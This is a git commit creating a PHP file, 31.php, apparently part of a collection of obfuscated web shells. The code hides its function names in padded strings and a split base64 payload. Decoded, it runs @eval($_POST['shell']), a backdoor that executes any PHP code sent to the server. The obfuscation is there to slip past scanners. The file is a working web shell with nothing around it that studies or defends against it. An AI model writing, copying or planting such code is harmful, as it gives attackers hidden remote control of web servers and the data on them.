fe6f4d0f7b49def2987c14ce458a021a14944306
0xFlag <54313514+0xFlag@users.noreply.github.com>
2020-08-15 14:21:32 +0800

    Create 31.php

---
+++ yjh/php/31.php
@@ -0,0 +1,11 @@
+<?php
+$mt="sKCRfleUE9T";
+$ojj="IEBleldmF";
+$hsa="VFsnc2lehlbGwn";
+$fnx="XSk7";
+$zk = str_replace("d","","sdtdrd_redpdldadcde");
+$ef = $zk("z", "", "zbazsze64_zdzeczodze");
+$dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn");
+$zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx)));
+$zvm();
+?>
